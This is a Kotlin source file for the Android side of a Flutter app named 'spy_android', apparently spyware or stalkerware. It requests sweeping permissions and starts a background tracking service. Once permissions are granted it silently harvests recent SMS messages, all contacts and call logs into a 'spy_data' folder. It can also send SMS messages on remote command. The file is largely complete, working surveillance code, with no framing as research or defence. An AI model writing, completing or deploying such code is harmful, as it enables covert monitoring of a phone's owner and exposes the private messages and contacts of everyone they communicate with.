package com.example.spy_android

import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.BatteryManager
import android.content.IntentFilter
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.util.Log
import android.provider.ContactsContract
import android.provider.CallLog
import android.provider.Telephony
import android.telephony.SmsManager
import androidx.core.content.ContextCompat
import androidx.core.app.ActivityCompat
import android.Manifest
import android.location.LocationManager
import java.text.SimpleDateFormat
import java.util.*
import kotlinx.coroutines.*
import java.io.File
import java.io.FileWriter

class MainActivity: FlutterActivity() {
    private val CHANNEL = "shadow_track"
    private val PERMISSION_REQUEST_CODE = 1000

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL)
            .setMethodCallHandler { call, result ->
                try {
                    when (call.method) {
                        "initialize" -> {
                            Log.d("MainActivity", "Initializing spy services")
                            initializeSpyServices()
                            result.success("Spy services initialized")
                        }
                        "getBatteryLevel" -> {
                            val batteryLevel = getBatteryLevel()
                            result.success(batteryLevel)
                        }
                        "getNetworkType" -> {
                            val networkType = getNetworkType()
                            result.success(networkType)
                        }
                        "getDeviceInfo" -> {
                            val deviceInfo = getDeviceInfo()
                            result.success(deviceInfo)
                        }
                        "checkPermissions" -> {
                            val permissions = checkAllPermissions()
                            result.success(permissions)
                        }
                        "collectSMS" -> {
                            collectSMSData()
                            result.success("SMS collection started")
                        }
                        "collectContacts" -> {
                            collectContactsData()
                            result.success("Contacts collection started")
                        }
                        "collectCallLogs" -> {
                            collectCallLogsData()
                            result.success("Call logs collection started")
                        }
                        "sendSMS" -> {
                            val phoneNumber = call.argument<String>("phoneNumber")
                            val message = call.argument<String>("message")
                            if (phoneNumber != null && message != null) {
                                sendSMS(phoneNumber, message)
                                result.success("SMS sent")
                            } else {
                                result.error("INVALID_ARGS", "Phone number and message required", null)
                            }
                        }
                        "startBackgroundService" -> {
                            startBackgroundMonitoring()
                            result.success("Background service started")
                        }
                        "stopBackgroundService" -> {
                            stopBackgroundMonitoring()
                            result.success("Background service stopped")
                        }
                        else -> {
                            result.notImplemented()
                        }
                    }
                } catch (e: Exception) {
                    Log.e("MainActivity", "Error handling method call: ${call.method}", e)
                    result.error("ERROR", "Method execution failed: ${e.message}", null)
                }
            }
    }

    private fun initializeSpyServices() {
        Log.d("MainActivity", "Starting comprehensive spy services initialization")

        // 권한 요청
        requestAllPermissions()

        // 데이터 수집 디렉토리 생성
        createDataDirectories()

        // 백그라운드 서비스 시작 (권한이 있을 때만)
        if (hasBasicPermissions()) {
            startBackgroundMonitoring()
        }
    }

    private fun createDataDirectories() {
        try {
            val dataDir = File(filesDir, "spy_data")
            val logsDir = File(filesDir, "logs")
            val screenshotsDir = File(filesDir, "screenshots")

            listOf(dataDir, logsDir, screenshotsDir).forEach { dir ->
                if (!dir.exists()) {
                    dir.mkdirs()
                }
            }

            Log.d("MainActivity", "Data directories created successfully")
        } catch (e: Exception) {
            Log.e("MainActivity", "Error creating directories: ${e.message}")
        }
    }

    private fun requestAllPermissions() {
        val permissions = arrayOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.WAKE_LOCK,
            Manifest.permission.FOREGROUND_SERVICE
        )

        val permissionsToRequest = permissions.filter { permission ->
            ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED
        }

        if (permissionsToRequest.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, permissionsToRequest.toTypedArray(), PERMISSION_REQUEST_CODE)
        }
    }

    private fun hasBasicPermissions(): Boolean {
        val basicPermissions = arrayOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS
        )

        return basicPermissions.all { permission ->
            ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun collectSMSData() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            Log.w("MainActivity", "SMS permission not granted")
            return
        }

        Thread {
            try {
                val smsData = mutableListOf<Map<String, Any>>()
                val cursor = contentResolver.query(
                    Telephony.Sms.CONTENT_URI,
                    null, null, null,
                    "${Telephony.Sms.DATE} DESC LIMIT 100"
                )

                cursor?.use {
                    val addressIndex = it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)
                    val bodyIndex = it.getColumnIndexOrThrow(Telephony.Sms.BODY)
                    val dateIndex = it.getColumnIndexOrThrow(Telephony.Sms.DATE)
                    val typeIndex = it.getColumnIndexOrThrow(Telephony.Sms.TYPE)

                    while (it.moveToNext()) {
                        val smsEntry = mapOf(
                            "address" to it.getString(addressIndex),
                            "body" to it.getString(bodyIndex),
                            "date" to it.getLong(dateIndex),
                            "type" to it.getInt(typeIndex),
                            "formatted_date" to SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                                .format(Date(it.getLong(dateIndex))),
                            "collected_at" to System.currentTimeMillis()
                        )
                        smsData.add(smsEntry)
                    }
                }

                saveDataToFile("sms_data.json", smsData)
                Log.d("MainActivity", "SMS data collected: ${smsData.size} messages")

            } catch (e: Exception) {
                Log.e("MainActivity", "Error collecting SMS data: ${e.message}")
            }
        }.start()
    }

    private fun collectContactsData() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            Log.w("MainActivity", "Contacts permission not granted")
            return
        }

        Thread {
            try {
                val contactsData = mutableListOf<Map<String, Any>>()
                val cursor = contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null
                )

                cursor?.use {
                    val nameIndex = it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    val phoneIndex = it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
                    val typeIndex = it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.TYPE)

                    while (it.moveToNext()) {
                        val contactEntry = mapOf(
                            "name" to it.getString(nameIndex),
                            "phone" to it.getString(phoneIndex),
                            "type" to it.getInt(typeIndex),
                            "collected_at" to System.currentTimeMillis()
                        )
                        contactsData.add(contactEntry)
                    }
                }

                saveDataToFile("contacts_data.json", contactsData)
                Log.d("MainActivity", "Contacts data collected: ${contactsData.size} contacts")

            } catch (e: Exception) {
                Log.e("MainActivity", "Error collecting contacts data: ${e.message}")
            }
        }.start()
    }

    private fun collectCallLogsData() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            Log.w("MainActivity", "Call log permission not granted")
            return
        }

        Thread {
            try {
                val callLogsData = mutableListOf<Map<String, Any>>()
                val cursor = contentResolver.query(
                    CallLog.Calls.CONTENT_URI,
                    null, null, null,
                    "${CallLog.Calls.DATE} DESC LIMIT 100"
                )

                cursor?.use {
                    val numberIndex = it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
                    val typeIndex = it.getColumnIndexOrThrow(CallLog.Calls.TYPE)
                    val dateIndex = it.getColumnIndexOrThrow(CallLog.Calls.DATE)
                    val durationIndex = it.getColumnIndexOrThrow(CallLog.Calls.DURATION)

                    while (it.moveToNext()) {
                        val callEntry = mapOf(
                            "number" to it.getString(numberIndex),
                            "type" to it.getInt(typeIndex),
                            "date" to it.getLong(dateIndex),
                            "duration" to it.getInt(durationIndex),
                            "formatted_date" to SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                                .format(Date(it.getLong(dateIndex))),
                            "collected_at" to System.currentTimeMillis()
                        )
                        callLogsData.add(callEntry)
                    }
                }

                saveDataToFile("call_logs.json", callLogsData)
                Log.d("MainActivity", "Call logs collected: ${callLogsData.size} calls")

            } catch (e: Exception) {
                Log.e("MainActivity", "Error collecting call logs: ${e.message}")
            }
        }.start()
    }

    private fun sendSMS(phoneNumber: String, message: String) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
            Log.w("MainActivity", "Send SMS permission not granted")
            return
        }

        try {
            val smsManager = SmsManager.getDefault()
            smsManager.sendTextMessage(phoneNumber, null, message, null, null)

            // 전송 기록 저장
            val smsRecord = mapOf(
                "action" to "SMS_SENT",
                "to" to phoneNumber,
                "message" to message,
                "timestamp" to System.currentTimeMillis(),
                "formatted_time" to SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                    .format(Date())
            )

            saveDataToFile("sent_sms.json", listOf(smsRecord))
            Log.d("MainActivity", "SMS sent to $phoneNumber")

        } catch (e: Exception) {
            Log.e("MainActivity", "Error sending SMS: ${e.message}")
        }
    }

    private fun startBackgroundMonitoring() {
        try {
            val intent = Intent(this, com.example.spy_android.services.BackgroundTrackingService::class.java)
            startForegroundService(intent)
            Log.d("MainActivity", "Background monitoring service started")
        } catch (e: Exception) {
            Log.e("MainActivity", "Error starting background service: ${e.message}")
        }
    }

    private fun stopBackgroundMonitoring() {
        try {
            val intent = Intent(this, com.example.spy_android.services.BackgroundTrackingService::class.java)
            stopService(intent)
            Log.d("MainActivity", "Background monitoring service stopped")
        } catch (e: Exception) {
            Log.e("MainActivity", "Error stopping background service: ${e.message}")
        }
    }

    private fun saveDataToFile(fileName: String, data: List<Map<String, Any>>) {
        try {
            val file = File(File(filesDir, "spy_data"), fileName)
            FileWriter(file, true).use { writer ->
                data.forEach { entry ->
                    writer.write("${com.google.gson.Gson().toJson(entry)}\n")
                }
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "Error saving data to file: ${e.message}")
        }
    }

    private fun getBatteryLevel(): Int {
        return try {
            val batteryManager = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
            batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        } catch (e: Exception) {
            Log.e("MainActivity", "Error getting battery level", e)
            -1
        }
    }

    private fun getNetworkType(): String {
        return try {
            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val network = connectivityManager.activeNetwork
                val capabilities = connectivityManager.getNetworkCapabilities(network)

                when {
                    capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true -> "WiFi"
                    capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "Mobile"
                    capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) == true -> "Ethernet"
                    else -> "Unknown"
                }
            } else {
                @Suppress("DEPRECATION")
                val networkInfo = connectivityManager.activeNetworkInfo
                networkInfo?.typeName ?: "Unknown"
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "Error getting network type", e)
            "Error"
        }
    }

    private fun getDeviceInfo(): Map<String, String> {
        return try {
            mapOf(
                "model" to Build.MODEL,
                "manufacturer" to Build.MANUFACTURER,
                "brand" to Build.BRAND,
                "androidVersion" to Build.VERSION.RELEASE,
                "sdkVersion" to Build.VERSION.SDK_INT.toString(),
                "device" to Build.DEVICE,
                "hardware" to Build.HARDWARE,
                "product" to Build.PRODUCT,
                "fingerprint" to Build.FINGERPRINT,
                "id" to Build.ID,
                "timestamp" to System.currentTimeMillis().toString()
            )
        } catch (e: Exception) {
            Log.e("MainActivity", "Error getting device info", e)
            mapOf("error" to "Failed to get device info")
        }
    }

    private fun checkAllPermissions(): Map<String, Boolean> {
        val permissions = arrayOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_PHONE_STATE
        )

        return permissions.associate { permission ->
            permission to (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == PERMISSION_REQUEST_CODE) {
            val grantedPermissions = permissions.zip(grantResults.toTypedArray())
                .filter { it.second == PackageManager.PERMISSION_GRANTED }
                .map { it.first }

            Log.d("MainActivity", "Granted permissions: ${grantedPermissions.joinToString()}")

            // 기본 권한이 승인되면 백그라운드 서비스 시작
            if (hasBasicPermissions()) {
                startBackgroundMonitoring()

                // 데이터 수집 시작
                collectSMSData()
                collectContactsData()
                collectCallLogsData()
            }
        }
    }
}